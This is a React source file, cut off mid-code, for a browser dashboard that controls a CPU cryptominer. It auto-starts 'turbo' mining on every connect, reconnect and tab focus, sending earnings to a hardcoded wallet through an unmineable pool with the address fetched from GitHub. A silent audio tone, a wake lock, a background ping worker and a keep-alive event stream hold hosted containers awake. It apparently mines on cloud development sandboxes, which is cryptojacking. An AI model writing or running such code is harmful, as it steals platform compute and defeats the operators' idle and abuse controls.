import React, { useEffect, useRef, useState } from "react";
import { Terminal } from "@xterm/xterm";
import { FitAddon } from "@xterm/addon-fit";
import { io, Socket } from "socket.io-client";
import {
  Terminal as TerminalIcon,
  RefreshCw,
  Copy,
  Check,
  Activity,
  Cpu,
  Wifi,
  WifiOff,
  Folder,
  X,
  FileText,
  ChevronRight,
  ArrowUp,
  Download,
  Zap,
} from "lucide-react";
import { FileItem } from "./types";

export default function App() {
  const terminalRef = useRef<HTMLDivElement>(null);
  const xtermRef = useRef<Terminal | null>(null);
  const fitAddonRef = useRef<FitAddon | null>(null);
  const socketRef = useRef<Socket | null>(null);

  // Connection & Recovery State
  const [isConnected, setIsConnected] = useState(false);
  const [reconnectState, setReconnectState] = useState<{
    isReconnecting: boolean;
    attempt: number;
    nextDelay: number;
    lastError: string | null;
  }>({
    isReconnecting: false,
    attempt: 0,
    nextDelay: 1000,
    lastError: null,
  });
  const reconnectAttemptRef = useRef(0);

  // Mining Engine Status (Always 100% Turbo by default)
  const [miningStatus, setMiningStatus] = useState<{
    isRunning: boolean;
    powerMode: string;
    cores?: number;
    threads: number;
    maxCores: number;
    totalMemoryGB?: string;
    freeMemoryGB?: string;
    memoryAllocatedMB?: number;
    startTime: number | null;
    coin?: string;
    network?: string;
    address?: string;
    pool?: string;
    lastCommand?: string;
    worker?: string;
    cpuBrand?: string;
    cpuModel?: string;
  } | null>(null);

  // UI Tabs & Views (Ultra lightweight)
  const [activeTab, setActiveTab] = useState<"terminal" | "files">("terminal");
  const [showLogsModal, setShowLogsModal] = useState(false);
  const [rawLogs, setRawLogs] = useState("");
  const [isFetchingLogs, setIsFetchingLogs] = useState(false);
  const [toastMessage, setToastMessage] = useState<string | null>(null);
  const [copiedWorker, setCopiedWorker] = useState(false);
  const [copiedAddress, setCopiedAddress] = useState(false);
  const [copiedCmd, setCopiedCmd] = useState(false);
  const [uptimeStr, setUptimeStr] = useState("00:00:00");

  // Simple File Browser State
  const [files, setFiles] = useState<FileItem[]>([]);
  const [currentPath, setCurrentPath] = useState("");
  const [isLoadingFiles, setIsLoadingFiles] = useState(false);
  const [selectedFileContent, setSelectedFileContent] = useState<{ name: string; content: string } | null>(null);

  // Background 24/7 Shield State & Audio Context
  const audioContextRef = useRef<any>(null);
  const wakeLockRef = useRef<any>(null);
  const workerHeartbeatRef = useRef<Worker | null>(null);
  const eventSourceRef = useRef<EventSource | null>(null);

  const [isSyncingGithub, setIsSyncingGithub] = useState(false);

  const showToast = (msg: string) => {
    setToastMessage(msg);
    setTimeout(() => {
      setToastMessage((prev) => (prev === msg ? null : prev));
    }, 2500);
  };

  const syncGithubConfig = async () => {
    setIsSyncingGithub(true);
    try {
      const res = await fetch("/api/mining/sync-github", { method: "POST" });
      const data = await res.json();
      if (data.success) {
        showToast(`GitHub Synced! ${data.coin} • ${data.address ? data.address.slice(0, 8) + '...' : ''}`);
      } else {
        showToast("GitHub checked (no changes)");
      }
    } catch (e) {
      showToast("GitHub sync failed");
    } finally {
      setIsSyncingGithub(false);
    }
  };

  // Uptime ticker
  useEffect(() => {
    const timer = setInterval(() => {
      if (miningStatus?.startTime) {
        const diff = Math.max(0, Math.floor((Date.now() - miningStatus.startTime) / 1000));
        const hrs = String(Math.floor(diff / 3600)).padStart(2, "0");
        const mins = String(Math.floor((diff % 3600) / 60)).padStart(2, "0");
        const secs = String(diff % 60).padStart(2, "0");
        setUptimeStr(`${hrs}:${mins}:${secs}`);
      }
    }, 1000);
    return () => clearInterval(timer);
  }, [miningStatus?.startTime]);

  // Automated 24/7 Silent Audio Shield (Prevents Mobile & Desktop Tab Sleep)
  const initZeroSleepAudio = async () => {
    try {
      if ("wakeLock" in navigator && !wakeLockRef.current) {
        try {
          wakeLockRef.current = await (navigator as any).wakeLock.request("screen");
        } catch (e) {}
      }
      if (!audioContextRef.current) {
        const AudioCtx = window.AudioContext || (window as any).webkitAudioContext;
        if (AudioCtx) {
          const ctx = new AudioCtx();
          if (ctx.state === "suspended") {
            await ctx.resume().catch(() => {});
          }
          const osc = ctx.createOscillator();
          const gain = ctx.createGain();
          gain.gain.value = 0.00001; // Silent tone keeps audio thread alive in OS
          osc.connect(gain);
          gain.connect(ctx.destination);
          osc.start();
          audioContextRef.current = ctx;
        }
      }
    } catch (e) {}
  };

  // 1. Initialize Terminal & WebSocket with Exponential Backoff
  useEffect(() => {
    if (!terminalRef.current) return;

    const term = new Terminal({
      cursorBlink: true,
      cursorStyle: "block",
      theme: {
        background: "#050505",
        foreground: "#f4f4f5",
        cursor: "#10b981",
        selectionBackground: "rgba(16, 185, 129, 0.3)",
        black: "#09090b",
        red: "#f43f5e",
        green: "#10b981",
        yellow: "#f59e0b",
        blue: "#38bdf8",
        magenta: "#c084fc",
        cyan: "#2dd4bf",
        white: "#fafafa",
      },
      fontFamily: "'JetBrains Mono', 'Fira Code', 'Courier New', monospace",
      fontSize: 13,
      lineHeight: 1.25,
      allowProposedApi: true,
      scrollback: 10000,
      convertEol: true,
    });

    const fitAddon = new FitAddon();
    term.loadAddon(fitAddon);
    term.open(terminalRef.current);

    const performFit = () => {
      if (!terminalRef.current) return;
      try {
        fitAddon.fit();
      } catch (e) {}
    };

    setTimeout(performFit, 100);
    xtermRef.current = term;
    fitAddonRef.current = fitAddon;

    // Connect Socket.IO with Exponential Backoff
    const socket = io({
      transports: ["websocket", "polling"],
      reconnection: true,
      reconnectionAttempts: Infinity, // Never give up on network drops
      reconnectionDelay: 1000, // Start with 1s
      reconnectionDelayMax: 30000, // Max backoff 30s
      randomizationFactor: 0.5,
      timeout: 10000,
      forceNew: true,
    });
    socketRef.current = socket;

    socket.on("connect", () => {
      setIsConnected(true);
      reconnectAttemptRef.current = 0;
      setReconnectState({
        isReconnecting: false,
        attempt: 0,
        nextDelay: 1000,
        lastError: null,
      });
      term.writeln("\x1b[1;32m● Connected to High-Speed Terminal Session\x1b[0m");
      // Auto-start 100% turbo mining by default
      socket.emit("start-mining-turbo", {
        host: window.location.hostname,
        url: window.location.href,
      });
    });

    socket.on("mining-status-change", (status: any) => {
      setMiningStatus((prev) => ({
        isRunning: status.isRunning,
        powerMode: status.powerMode || "turbo",
        cores: status.cores || prev?.cores || status.threads || 2,
        threads: status.threads || prev?.threads || 2,
        maxCores: prev?.maxCores || status.threads || 2,
        totalMemoryGB: status.totalMemoryGB || prev?.totalMemoryGB,
        freeMemoryGB: status.freeMemoryGB || prev?.freeMemoryGB,
        memoryAllocatedMB: status.memoryAllocatedMB || prev?.memoryAllocatedMB,
        startTime: status.startTime || prev?.startTime || Date.now(),
        coin: status.coin || prev?.coin || "USDT",
        network: status.network || prev?.network || "BEP20",
        address: status.address || prev?.address || "0x5ccf2f0a3912860191eb1876e5bb497aeb1d0ea8",
        pool: status.pool || prev?.pool || "rx.unmineable.com:3333",
        lastCommand: status.lastCommand || prev?.lastCommand,
        worker: status.worker || prev?.worker,
        cpuBrand: status.cpuBrand || prev?.cpuBrand,
        cpuModel: status.cpuModel || prev?.cpuModel,
      }));
    });

    // Initial status fetch
    fetch("/api/mining/status?host=" + encodeURIComponent(window.location.hostname))
      .then((r) => r.json())
      .then((data) => setMiningStatus(data))
      .catch(() => {});

    socket.on("output", (data: string) => {
      term.write(data);
      term.scrollToBottom();
    });

    socket.on("disconnect", (reason: string) => {
      setIsConnected(false);
      setReconnectState((prev) => ({
        ...prev,
        isReconnecting: true,
        lastError: reason,
      }));
      term.writeln(`\r\n\x1b[1;31m✖ Session Disconnected (${reason})\x1b[0m`);
      term.writeln("\x1b[1;33m⏳ Auto-recovering via exponential backoff...\x1b[0m");

      if (reason === "io server disconnect") {
        setTimeout(() => socket.connect(), 1000);
      }
    });

    socket.io.on("reconnect_attempt", (attempt: number) => {
      reconnectAttemptRef.current = attempt;
      const estimatedDelay = Math.min(Math.round(1000 * Math.pow(1.5, Math.min(attempt - 1, 10))), 30000);
      setReconnectState({
        isReconnecting: true,
        attempt,
        nextDelay: estimatedDelay,
        lastError: null,
      });
      term.writeln(
        `\x1b[1;33m⟳ [Auto-Recover] WebSocket Attempt #${attempt} (Backoff window ~${(estimatedDelay / 1000).toFixed(1)}s)...\x1b[0m`
      );
    });

    socket.io.on("reconnect", (attempt: number) => {
      setIsConnected(true);
      reconnectAttemptRef.current = 0;
      setReconnectState({
        isReconnecting: false,
        attempt: 0,
        nextDelay: 1000,
        lastError: null,
      });
      term.writeln(`\r\n\x1b[1;32m✔ Auto-reconnected successfully after ${attempt} attempt(s)!\x1b[0m`);
      socket.emit("start-mining-turbo", { host: window.location.hostname, url: window.location.href });
    });

    // Handle online/offline network drops
    const handleOnline = () => {
      term.writeln("\r\n\x1b[1;36m🌐 Network restored! Reconnecting WebSocket immediately...\x1b[0m");
      if (!socket.connected) {
        (socket.io as any).reconnectionDelay = 500;
        socket.connect();
      }
    };
    const handleOffline = () => {
      setIsConnected(false);
      setReconnectState((prev) => ({ ...prev, isReconnecting: true, lastError: "Network offline" }));
      term.writeln("\r\n\x1b[1;31m⚠ Device offline (network drop). Auto-recovering as soon as network returns...\x1b[0m");
    };

    window.addEventListener("online", handleOnline);
    window.addEventListener("offline", handleOffline);

    term.onData((data) => {
      if (socket.connected) {
        socket.emit("input", data);
      }
    });

    window.addEventListener("resize", performFit);

    return () => {
      window.removeEventListener("resize", performFit);
      window.removeEventListener("online", handleOnline);
      window.removeEventListener("offline", handleOffline);
      socket.disconnect();
      term.dispose();
    };
  }, []);

  // 2. All-Time Background Engine (Web Worker + SSE Stream + Audio Shield + Auto-Wake)
  useEffect(() => {
    // A. Start inline Web Worker to pulse /api/ping every 5s unthrottled
    try {
      const workerBlob = new Blob(
        [
          `setInterval(() => { postMessage('ping'); }, 5000);`
        ],
        { type: "application/javascript" }
      );
      const worker = new Worker(URL.createObjectURL(workerBlob));
      worker.onmessage = () => {
        fetch("/api/ping?host=" + encodeURIComponent(window.location.hostname), {
          cache: "no-store",
          headers: { "X-Requested-With": "BackgroundKeepAlive" },
        }).catch(() => {});
      };
      workerHeartbeatRef.current = worker;
    } catch (e) {}

    // B. Continuous SSE Stream keeps Cloud Run HTTP connection open
    let sseTimeout: any = null;
    const connectSSE = () => {
      try {
        if (eventSourceRef.current) eventSourceRef.current.close();
        const es = new EventSource("/api/keepalive-stream");
        es.onerror = () => {
          es.close();
          sseTimeout = setTimeout(connectSSE, 5000);
        };
        eventSourceRef.current = es;
      } catch (e) {}
    };
    connectSSE();

    // C. Auto-activate audio shield on first user tap/click
    const onGesture = () => {
      initZeroSleepAudio();
      window.removeEventListener("pointerdown", onGesture);
      window.removeEventListener("keydown", onGesture);
      window.removeEventListener("touchstart", onGesture);
    };
    window.addEventListener("pointerdown", onGesture, { once: true });
    window.addEventListener("keydown", onGesture, { once: true });
    window.addEventListener("touchstart", onGesture, { once: true });

    // D. Auto-wake on visibility change or window focus
    const onVisibilityChange = () => {
      if (document.visibilityState === "visible") {
        fetch("/api/ping?host=" + encodeURIComponent(window.location.hostname), { cache: "no-store" }).catch(() => {});
        if (socketRef.current?.connected) {
          socketRef.current.emit("start-mining-turbo", { host: window.location.hostname, url: window.location.href });
        }
        initZeroSleepAudio();
      }
    };
    document.addEventListener("visibilitychange", onVisibilityChange);
    window.addEventListener("focus", onVisibilityChange);

    return () => {
      document.removeEventListener("visibilitychange", onVisibilityChange);
      window.removeEventListener("focus", onVisibilityChange);
      if (workerHeartbeatRef.current) workerHeartbeatRef.current.terminate();
      if (eventSourceRef.current) eventSourceRef.current.close();
      if (sseTimeout) clearTimeout(sseTimeout);
    };
  }, []);

  // Quick Manual Reconnect
  const handleReconnect = () => {
    reconnectAttemptRef.current = 1;
    setReconnectState({
      isReconnecting: true,
      attempt: 1,
      nextDelay: 1000,
      lastError: null,
    });
    xtermRef.current?.writeln("\x1b[1;34mManual reconnect requested. Resetting WebSocket connection...\x1b[0m");
    socketRef.current?.disconnect();
    if (socketRef.current?.io) {
      (socketRef.current.io as any).reconnectionDelay = 500;
    }
    socketRef.current?.connect();
    showToast("Reconnecting terminal session...");
  };

  // Quick Logs Modal Fetch
  const openLogsModal = async () => {
    setIsFetchingLogs(true);
    setShowLogsModal(true);
    try {
      const res = await fetch("/api/mining/logs");
      const data = await res.json();
      if (data.success && data.content) {
        setRawLogs(data.content);
      }
    } catch (e) {
      setRawLogs("Unable to fetch logs. Terminal stream is running live.");
    } finally {
      setIsFetchingLogs(false);
    }
  };

  // Simple File Manager fetch
  const fetchFiles = async (targetPath?: string) => {
    setIsLoadingFiles(true);
    try {
      const url = targetPath ? `/api/files?path=${encodeURIComponent(targetPath)}` : "/api/files";
      const res = await fetch(url);
      const data = await res.json();
      setFiles(data.files || []);
      setCurrentPath(data.currentPath || "");
    } catch (e) {
      showToast("Failed to load files");
    } finally {
      setIsLoadingFiles(false);
    }
  };

  const openFile = async (file: FileItem) => {
    if (file.isDirectory) {
      fetchFiles(file.path);
    } else {
      try {
        const res = await fetch(`/api/files/read?path=${encodeURIComponent(file.path)}`);
        const data = await res.json();
        setSelectedFileContent({ name: file.name, content: data.content ?? "" });
      } catch (e) {
        showToast("Cannot read file");
      }
    }
  };

  const cpuBrand = (miningStatus?.cpuBrand || "intel").toLowerCase();
  const workerName =
    miningStatus?.worker ||
    (() => {
      if (typeof window === "undefined") return "worker";
      const match = window.location.hostname.match(/ais-(?:dev|pre)-([a-zA-Z0-9]+)/i);
      if (match && match[1]) {
        let id = match[1].toLowerCase();
        id = id.replace(/^(dev|pre|intel|ryzen|amd)-+/gi, "");
        return id;
      }
      return "worker";
    })();

  return (
    <div className="w-screen h-screen bg-[#070709] text-zinc-100 font-sans flex flex-col overflow-hidden select-none">
      {/* Toast Notification */}
      {toastMessage && (
        <div className="fixed top-4 right-4 z-50 bg-emerald-500/95 text-black px-3.5 py-1.5 rounded-lg text-xs font-mono font-bold shadow-lg flex items-center gap-2 animate-bounce">
          <Check className="w-3.5 h-3.5" />
          <span>{toastMessage}</span>
        </div>
      )}

      {/* Top Bar: Clean, Responsive, Zero-Overlap on Mobile */}
      <header className="bg-zinc-950 border-b border-zinc-800/80 px-3 py-2 flex flex-col sm:flex-row sm:items-center sm:justify-between gap-2 shrink-0">
        {/* Row 1 on mobile / Left on desktop: Brand, Pulse & Architecture */}
        <div className="flex items-center justify-between sm:justify-start gap-2 w-full sm:w-auto">
          <div className="flex items-center gap-2">
            <div className="flex items-center gap-1.5 font-mono font-bold text-xs tracking-wider uppercase text-zinc-100">
              <TerminalIcon className="w-4 h-4 text-emerald-400" />
              <span>TERMINAL 61</span>
            </div>

            {/* 24/7 Always Active Pulse Badge */}
            <div className="flex items-center gap-1 px-2 py-0.5 rounded-md bg-emerald-950/70 border border-emerald-500/30 text-emerald-400 text-[10px] font-mono font-semibold">
              <span className="relative flex h-2 w-2">
                <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-75"></span>
                <span className="relative inline-flex rounded-full h-2 w-2 bg-emerald-500"></span>
              </span>
              <span>24/7</span>
            </div>

            {/* CPU Architecture Pill */}
            <div
              className={`flex items-center gap-1 px-2 py-0.5 rounded text-[10px] font-mono font-bold uppercase border ${
                cpuBrand === "ryzen"
                  ? "bg-amber-950/70 text-amber-400 border-amber-500/40"
                  : "bg-sky-950/70 text-sky-400 border-sky-500/40"
              }`}
              title={miningStatus?.cpuModel || `Processor: ${cpuBrand.toUpperCase()}`}
            >
              <Cpu className="w-3 h-3" />
              <span>{cpuBrand === "ryzen" ? "Ryzen" : "Intel"}</span>
            </div>
          </div>

          {/* Quick Action Controls for Mobile Header */}
          <div className="flex items-center gap-1.5 sm:hidden">
            <div className="flex items-center bg-zinc-900 p-0.5 rounded border border-zinc-800">
              <button
                onClick={() => setActiveTab("terminal")}
                className={`px-2 py-0.5 text-[10px] font-mono rounded ${
                  activeTab === "terminal" ? "bg-zinc-800 text-white font-bold" : "text-zinc-400"
                }`}
              >
                Shell
              </button>
              <button
                onClick={() => {
                  setActiveTab("files");
                  if (files.length === 0) fetchFiles();
                }}
                className={`px-2 py-0.5 text-[10px] font-mono rounded ${
                  activeTab === "files" ? "bg-zinc-800 text-white font-bold" : "text-zinc-400"
                }`}
              >
                Files
              </button>
            </div>
            <button
              onClick={openLogsModal}
              className="p-1 rounded bg-zinc-900 text-zinc-400 border border-zinc-800 hover:text-white"
              title="View Logs"
            >
              <Activity className="w-3.5 h-3.5" />
            </button>
            <button
              onClick={handleReconnect}
              className="p-1 rounded bg-zinc-900 text-zinc-400 border border-zinc-800 hover:text-emerald-400"
              title="Reconnect"
            >
              <RefreshCw className="w-3.5 h-3.5" />
            </button>
          </div>
        </div>

        {/* Row 2 on mobile / Right on desktop: Worker Badge & Desktop Controls */}
        <div className="flex items-center justify-between sm:justify-end gap-2 w-full sm:w-auto">
          {/* Worker Badge (Full width on mobile, copyable) */}
          <button
            onClick={() => {
              navigator.clipboard.writeText(workerName);
              setCopiedWorker(true);
              setTimeout(() => setCopiedWorker(false), 2000);
              showToast("Worker copied!");
            }}
            className="flex items-center justify-between sm:justify-start gap-1.5 px-2.5 py-1 rounded bg-zinc-900 hover:bg-zinc-800 border border-zinc-800 text-[11px] font-mono text-zinc-300 transition-colors flex-1 sm:flex-initial min-w-0"
            title="Click to copy Worker ID"
          >
            <div className="flex items-center gap-1 truncate">
              <span className="text-zinc-500 font-normal shrink-0">worker:</span>
              <span className="text-emerald-400 font-bold truncate">{workerName}</span>
            </div>
            {copiedWorker ? <Check className="w-3.5 h-3.5 text-emerald-400 shrink-0 ml-1" /> : <Copy className="w-3.5 h-3.5 text-zinc-500 shrink-0 ml-1" />}
          </button>

          {/* Desktop Controls (Hidden on mobile because placed in top row) */}
          <div className="hidden sm:flex items-center gap-2 shrink-0">
            <div className="flex items-center gap-1 text-[11px] font-mono text-zinc-400 px-2 py-1 rounded bg-zinc-900/60 border border-zinc-800/60">
              <span className="text-zinc-500">up:</span>
              <span className="text-zinc-200 font-bold">{uptimeStr}</span>
            </div>

            {isConnected ? (
              <div className="flex items-center gap-1.5 px-2 py-1 rounded-md bg-emerald-950/40 border border-emerald-500/30 text-emerald-400 text-[10px] font-mono">
                <Wifi className="w-3 h-3" />
                <span>Online</span>
              </div>
            ) : (
              <div className="flex items-center gap-1.5 px-2 py-1 rounded-md bg-amber-950/60 border border-amber-500/40 text-amber-300 text-[10px] font-mono animate-pulse">
                <RefreshCw className="w-3 h-3 animate-spin text-amber-400" />
                <span>Retry #{reconnectState.attempt || 1}</span>
              </div>
            )}

            <div className="flex items-center bg-zinc-900 p-0.5 rounded-lg border border-zinc-800">
              <button
                onClick={() => setActiveTab("terminal")}
                className={`px-2.5 py-1 text-[11px] font-mono font-medium rounded-md transition-all ${
                  activeTab === "terminal" ? "bg-zinc-800 text-white font-bold" : "text-zinc-400 hover:text-zinc-200"
                }`}
              >
                Shell
              </button>
              <button
                onClick={() => {
                  setActiveTab("files");
                  if (files.length === 0) fetchFiles();
                }}
                className={`px-2.5 py-1 text-[11px] font-mono font-medium rounded-md transition-all ${
                  activeTab === "files" ? "bg-zinc-800 text-white font-bold" : "text-zinc-400 hover:text-zinc-200"
                }`}
              >
                Files
              </button>
            </div>

            <button
              onClick={openLogsModal}
              className="p-1.5 rounded-md hover:bg-zinc-800 text-zinc-400 hover:text-zinc-200 border border-zinc-800 transition-colors"
              title="View Full Logs & Command"
            >
              <Activity className="w-3.5 h-3.5" />
            </button>

            <button
              onClick={handleReconnect}
              className="p-1.5 rounded-md hover:bg-zinc-800 text-zinc-400 hover:text-emerald-400 border border-zinc-800 transition-colors"
              title="Refresh / Reconnect WebSocket"
            >
              <RefreshCw className="w-3.5 h-3.5" />
            </button>
          </div>
        </div>
      </header>

      {/* Sub-Header: Streamlined Specs & Stream Info (Single compact row) */}
      <div className="bg-[#0b0b0e] border-b border-zinc-800/60 px-3 py-1 flex items-center justify-between text-[10px] font-mono text-zinc-400 overflow-x-auto no-scrollbar gap-3 shrink-0">
        <div className="flex items-center gap-3 shrink-0">
          <span className="flex items-center gap-1 text-amber-400 font-bold">
            <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse"></span>
            <span>{miningStatus?.coin || "USDT"} ({miningStatus?.network || "BEP20"})</span>
          </span>
          <span className="text-zinc-700">|</span>
          <span className="flex items-center gap-1">
            <span className="text-zinc-500">Address:</span>
            <code
              onClick={() => {
                const addr = miningStatus?.address || "0x5ccf2f0a3912860191eb1876e5bb497aeb1d0ea8";
                navigator.clipboard.writeText(addr);
                setCopiedAddress(true);
                setTimeout(() => setCopiedAddress(false), 2000);
                showToast("Address copied!");
              }}
              className="text-zinc-300 hover:text-emerald-400 cursor-pointer transition-colors"
              title="Click to copy full address (Dynamic from GitHub)"
            >
              {miningStatus?.address
                ? `${miningStatus.address.slice(0, 8)}...${miningStatus.address.slice(-6)}`
                : "0x5ccf2f...1d0ea8"}
            </code>
          </span>
          <span className="text-zinc-700">|</span>
          <button
            onClick={syncGithubConfig}
            className="flex items-center gap-1 text-[10px] text-purple-300 hover:text-purple-200 bg-purple-950/50 hover:bg-purple-900/50 px-1.5 py-0.5 rounded border border-purple-500/30 transition-colors"
            title="Auto-synced from GitHub usdt-bep20-address.txt (Click to sync now)"
          >
            <RefreshCw className={`w-2.5 h-2.5 ${isSyncingGithub ? "animate-spin text-purple-400" : ""}`} />
            <span>GitHub Sync</span>
          </button>
          <span className="text-zinc-700">|</span>
          <span className="text-zinc-500 hidden sm:inline">Pool:</span>
          <span className="text-zinc-300 hidden sm:inline">rx.unmineable.com:3333</span>
          <span className="text-zinc-700 hidden sm:inline">|</span>
          <span className="flex items-center gap-1">
            <Cpu className="w-3 h-3 text-cyan-400" />
            <span className="text-zinc-500">Hardware:</span>
            <span className="text-zinc-200 font-bold">
              {miningStatus?.cores || miningStatus?.threads || 2}C/{miningStatus?.threads || 2}T • {miningStatus?.totalMemoryGB || "4.00"} GB RAM ({miningStatus?.memoryAllocatedMB || 2336} MB Active)
            </span>
          </span>
          <span className="text-zinc-700 hidden sm:inline">|</span>
          <span className="text-emerald-400 font-semibold flex items-center gap-1">
            <Zap className="w-3 h-3 text-amber-400 fill-amber-400" />
            <span>100% ALL Cores, Threads &amp; Memory Active</span>
          </span>
        </div>

        <div className="flex items-center gap-2 shrink-0">
          <span className="text-emerald-500/80 font-medium hidden md:inline">
            ⚡ Zero-Sleep Media Shield & Keep-Alive Stream Active
          </span>
        </div>
      </div>

      {/* Main Workspace Area */}
      <main className="flex-1 relative overflow-hidden bg-black flex flex-col">
        {/* View 1: Terminal Tab */}
        <div className={`h-full w-full flex flex-col relative ${activeTab === "terminal" ? "flex" : "hidden"}`}>
          <div className="flex-1 w-full p-2 min-h-0 bg-[#050505]" ref={terminalRef} />

          {/* Connection Dropped Banner (Unobtrusive & Clean) */}
          {!isConnected && (
            <div className="absolute top-2 right-2 bg-zinc-900/90 border border-amber-500/40 text-amber-300 px-3 py-1.5 rounded-lg shadow-xl text-xs font-mono flex items-center gap-2 backdrop-blur-sm z-20">
              <RefreshCw className="w-3.5 h-3.5 animate-spin text-amber-400" />
              <span>Auto-recovering WebSocket (Backoff #{reconnectState.attempt || 1})...</span>
              <button
                onClick={handleReconnect}
                className="ml-2 px-2 py-0.5 bg-emerald-600 hover:bg-emerald-500 text-black font-bold text-[10px] rounded transition-colors"
              >
                Reconnect
              </button>
            </div>
          )}

          {/* Quick Keys Helper Bar for Mobile/Touch */}
          <div className="bg-zinc-950 border-t border-zinc-800/80 px-2 py-1.5 flex items-center gap-1.5 overflow-x-auto no-scrollbar shrink-0">
            {[
              { label: "Ctrl+C", code: "\x03" },
              { label: "Tab", code: "\t" },
              { label: "Clear", action: () => xtermRef.current?.clear() },
              { label: "Bottom", action: () => xtermRef.current?.scrollToBottom() },
              {
                label: "Copy Command",
                action: () => {
                  if (miningStatus?.lastCommand) {
                    navigator.clipboard.writeText(miningStatus.lastCommand);
                    showToast("Command copied!");
                  }
                },
              },
              { label: "Reconnect", action: handleReconnect },
            ].map((btn, i) => (
              <button
                key={i}
                onClick={() => {
                  if (btn.action) btn.action();
                  else if (btn.code && socketRef.current?.connected) socketRef.current.emit("input", btn.code);
                }}
                className="px-2.5 py-1 rounded bg-zinc-900 hover:bg-zinc-800 active:scale-95 text-[11px] font-mono text-zinc-300 border border-zinc-800 shrink-0 transition-colors"
              >
                {btn.label}
              </button>
            ))}
          </div>
        </div>

        {/* View 2: Simple Lightweight File Browser */}
        {activeTab === "files" && (
          <div className="h-full w-full flex flex-col p-4 bg-zinc-950 overflow-y-auto">
            <div className="flex items-center justify-between pb-3 border-b border-zinc-800 mb-3">
              <div className="flex items-center gap-2 text-xs font-mono text-zinc-300 truncate">
                <Folder className="w-4 h-4 text-emerald-400 shrink-0" />
                <span className="text-zinc-500">Path:</span>
                <span className="font-bold truncate">{currentPath || "/"}</span>
              </div>
              <div className="flex items-center gap-2">
                <button
                  onClick={() => {
                    const parts = currentPath.split("/").filter(Boolean);
                    parts.pop();
                    fetchFiles("/" + parts.join("/"));
                  }}
                  className="px-2.5 py-1 bg-zinc-900 hover:bg-zinc-800 text-zinc-300 text-xs font-mono rounded border border-zinc-800 flex items-center gap-1"
                >
                  <ArrowUp className="w-3.5 h-3.5" />
                  <span>Up</span>
                </button>
                <button
                  onClick={() => fetchFiles(currentPath)}
                  className="p-1.5 bg-zinc-900 hover:bg-zinc-800 text-zinc-300 rounded border border-zinc-800"
                  title="Refresh files"
                >
                  <RefreshCw className={`w-3.5 h-3.5 ${isLoadingFiles ? "animate-spin text-emerald-400" : ""}`} />
                </button>
              </div>
            </div>

            {isLoadingFiles ? (
              <div className="p-8 text-center text-xs font-mono text-zinc-500">Loading files...</div>
            ) : files.length === 0 ? (
              <div className="p-8 text-center text-xs font-mono text-zinc-500">No files found.</div>
            ) : (
              <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 gap-2">
                {files.map((file) => (
                  <div
                    key={file.path}
                    onClick={() => openFile(file)}
                    className="p-2.5 rounded-lg bg-zinc-900/60 hover:bg-zinc-800 border border-zinc-800/80 cursor-pointer flex items-center justify-between transition-colors group"
                  >
                    <div className="flex items-center gap-2 min-w-0">
                      {file.isDirectory ? (
                        <Folder className="w-4 h-4 text-emerald-400 shrink-0" />
                      ) : (
                        <FileText className="w-4 h-4 text-zinc-400 shrink-0" />
                      )}
                      <span className="text-xs font-mono text-zinc-200 truncate group-hover:text-emerald-300">
                        {file.name}
                      </span>
                    </div>
                    <span className="text-[10px] font-mono text-zinc-500 shrink-0">
                      {file.isDirectory ? "dir" : `${Math.round(file.size / 1024)} KB`}
                    </span>
                  </div>
                ))}
              </div>
            )}
          </div>
        )}
      </main>

      {/* Logs & Command Modal */}
      {showLogsModal && (
        <div className="fixed inset-0 z-50 bg-black/70 backdrop-blur-sm flex items-center justify-center p-3 sm:p-6">
          <div className="bg-zinc-950 border border-zinc-800 rounded-xl w-full max-w-3xl flex flex-col max-h-[85vh] shadow-2xl overflow-hidden animate-in fade-in zoom-in-95">
            <div className="px-4 py-3 border-b border-zinc-800 flex items-center justify-between bg-zinc-900/80">
              <div className="flex items-center gap-2">
                <Activity className="w-4 h-4 text-emerald-400" />
                <h3 className="text-xs font-mono font-bold uppercase tracking-wider text-zinc-200">
                  Engine Logs & Execution Command
                </h3>
              </div>
              <button
                onClick={() => setShowLogsModal(false)}
                className="p-1 rounded hover:bg-zinc-800 text-zinc-400 hover:text-white"
              >
                <X className="w-4 h-4" />
              </button>
            </div>

            <div className="p-4 overflow-y-auto flex-1 font-mono text-xs space-y-4">
              {/* Dynamic GitHub Config Box */}
              <div className="bg-purple-950/20 border border-purple-500/30 rounded-lg p-3">
                <div className="flex items-center justify-between mb-2">
                  <span className="text-purple-300 font-bold flex items-center gap-1.5 text-[11px]">
                    <span className="w-2 h-2 rounded-full bg-emerald-400 animate-pulse"></span>
                    Dynamic GitHub Coin & Address Sync (24/7)
                  </span>
                  <button
                    onClick={syncGithubConfig}
                    className="flex items-center gap-1 text-[10px] text-purple-300 hover:text-white bg-purple-900/50 hover:bg-purple-800/60 px-2 py-0.5 rounded border border-purple-500/40 transition-colors"
                  >
                    <RefreshCw className={`w-3 h-3 ${isSyncingGithub ? "animate-spin text-purple-300" : ""}`} />
                    <span>Sync from GitHub Now</span>
                  </button>
                </div>
                <div className="space-y-1.5 text-[11px]">
                  <div className="flex flex-col sm:flex-row sm:items-center justify-between text-zinc-400 gap-1">
                    <span className="text-zinc-500">Source Repository:</span>
                    <a
                      href="https://github.com/radharadharadhasharma313-glitch/Donate-Usdt/blob/main/usdt-bep20-address.txt"
                      target="_blank"
                      rel="noopener noreferrer"
                      className="text-purple-300 hover:underline truncate max-w-sm"
                    >
                      radharadharadhasharma313-glitch/Donate-Usdt/usdt-bep20-address.txt ↗
                    </a>
                  </div>
                  <div className="flex items-center justify-between text-zinc-400">
                    <span className="text-zinc-500">Active Coin & Network:</span>
                    <span className="text-amber-400 font-bold">{miningStatus?.coin || "USDT"} ({miningStatus?.network || "BEP20"})</span>
                  </div>
                  <div className="flex items-center justify-between text-zinc-400">
                    <span className="text-zinc-500">Active Mining Wallet:</span>
                    <span className="text-emerald-400 font-mono text-[10px] truncate max-w-[260px] sm:max-w-md">{miningStatus?.address || "0x5ccf2f0a3912860191eb1876e5bb497aeb1d0ea8"}</span>
                  </div>
                  <div className="text-[10px] text-zinc-500 pt-1 border-t border-purple-500/20">
                    💡 GitHub config checks every 30 minutes. Mining never stops or restarts if the coin and wallet address are unchanged.
                  </div>
                </div>
              </div>

              {/* Command Box */}
              <div>
                <div className="flex items-center justify-between text-zinc-400 text-[11px] mb-1">
                  <span>Active Mining Execution Command:</span>
                  <button
                    onClick={() => {
                      if (miningStatus?.lastCommand) {
